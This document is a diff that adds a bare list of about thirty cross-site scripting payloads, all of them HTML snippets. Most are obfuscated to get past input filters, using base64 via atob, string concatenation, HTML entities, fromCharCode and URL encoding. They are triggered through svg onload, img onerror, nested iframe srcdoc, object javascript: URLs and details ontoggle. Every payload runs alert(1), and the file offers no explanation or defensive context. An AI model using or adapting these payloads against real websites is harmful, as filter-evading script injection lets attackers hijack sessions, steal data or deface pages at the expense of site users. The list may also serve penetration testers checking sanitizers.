@@ -1,0 +1,32 @@
+```html
+<svg onload=window[atob('YWxlcnQ=')](1)>
+<img src=x onerror=window['al'+'\u0065rt'](1)>
+<iframe srcdoc="<svg onload=window[atob('YWxlcnQ=')](1)>"></iframe>
+<object data="javascript:window['al'+'\u0065rt'](1)"></object>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<marquee onstart=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<img src=x onerror=setTimeout('al'+'ert(1)',0)>
+<svg onload=setTimeout('al'+'ert(1)',0)>
+<iframe srcdoc="<img src=x onerror=setInterval('al'+'ert(1)',1000)>"></iframe>
+<iframe srcdoc="<svg onload=setInterval('al'+'ert(1)',1000)>"></iframe>
+<object data="javascript:eval(atob('YWxlcnQoMSk='))"></object>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<svg onload=window['ev'+'al']('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<iframe srcdoc="<meta http-equiv=refresh content=0;url=javascript:eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<details open ontoggle=window['al'+'\u0065rt'](1)>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<object data="javascript:eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))"></object>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></iframe>
+<svg onload=eval('String.fromCharCode(97,108,101,114,116)(1)')>
+<iframe srcdoc="<object data='javascript:window[atob('YWxlcnQ=')](1)'></object>"></iframe>
+<img src=x onerror=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>
+<img src=x onerror=window['ev'+'al']('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<iframe srcdoc="<svg onload=window['ev'+'al']('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>
+<object data="javascript:eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)"></object>
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>
+```
